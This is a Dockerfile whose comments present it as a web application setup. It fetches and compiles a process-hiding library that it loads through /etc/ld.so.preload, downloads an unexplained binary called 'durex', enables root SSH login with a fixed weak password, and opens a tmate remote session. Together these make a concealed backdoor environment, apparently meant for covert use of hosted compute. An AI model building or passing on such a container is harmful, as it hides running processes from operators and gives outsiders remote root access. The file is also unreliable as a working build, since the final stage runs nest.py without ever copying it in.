# Stage 1: Base Image
FROM debian as base

# Install dependencies
RUN apt-get update && apt-get install -y \
    ssh git wget nano curl python3 python3-pip python3-venv tmate gcc

# Download and compile process hider
WORKDIR /tmp
RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
    && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
    && mv libprocess.so /usr/local/lib/ \
    && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload

# Download and make executable durex
RUN wget https://raw.githubusercontent.com/bulboni/tm/main/durex \
    && chmod +x durex

# Stage 2: Application Setup
FROM base as app_setup

# Download application files
RUN wget https://raw.githubusercontent.com/cihuuy/nest-web/main/nest.py \
    && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/requirements.txt


# Stage 3: Final Image
FROM base as final

# Copy compiled process hider and durex
COPY --from=app_setup /usr/local/lib/libprocess.so /usr/local/lib/
COPY --from=app_setup /tmp/durex /usr/local/bin/

# Setup SSH and Nginx
RUN mkdir /run/sshd \
    && echo "python3 -m venv myenv && source myenv/bin/activate && pip3 install -r requirements.txt" >> /openssh.sh \
    && echo 'sleep 2' >> /openssh.sh \
    && echo "python3 nest.py" >> /openssh.sh \
    && echo 'sleep 5' >> /openssh.sh \
    && echo "tmate -F &" >>/openssh.sh \
    && echo '/usr/sbin/sshd -D' >>/openssh.sh \
    && echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config  \
    && echo root:147|chpasswd \
    && chmod 755 /openssh.sh

# Expose necessary ports
EXPOSE 80 443 3306 4040 5432 5700 5701 5010 6800 6900 8080 8888 9000

# Start SSH and application
CMD ["/openssh.sh"]
